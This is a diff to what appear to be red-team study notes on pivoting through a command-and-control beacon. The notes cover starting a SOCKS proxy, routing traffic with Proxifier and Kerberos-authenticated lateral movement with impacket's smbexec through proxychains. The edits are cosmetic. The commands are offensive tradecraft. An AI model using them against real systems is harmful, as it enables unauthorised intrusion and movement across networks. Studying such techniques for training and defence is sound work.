@@ -3,12 +3,12 @@ tactic used to proxy traffic in or out of a network, using the beacon as the piv
 SOCKS (socket secure) proxy:
   to start the proxy via beacon:
     beacon> socks 1080
-  to connect on Windows using proxifier:
+  to connect on windows using proxifier:
     create a new proxy server profile, Profile > Proxy Servers
     enter the IP of the team server and the port (e.g. 1080)
     select the corresponding "SOCKS" protocol
     we can then add a proxification rule to specify the IP (range) of our target host
-  to authenticate via windows (on attacker windows desktop):
+  to authenticate via windows:
     authenticate using kerberos tickets (NOTE: add the hostname first, PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1')
       create a credential object:
         PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
@@ -35,5 +35,5 @@ SOCKS (socket secure) proxy:
           $ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache
         usage example:
           $ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1
-          
+
 reverse port forwarding
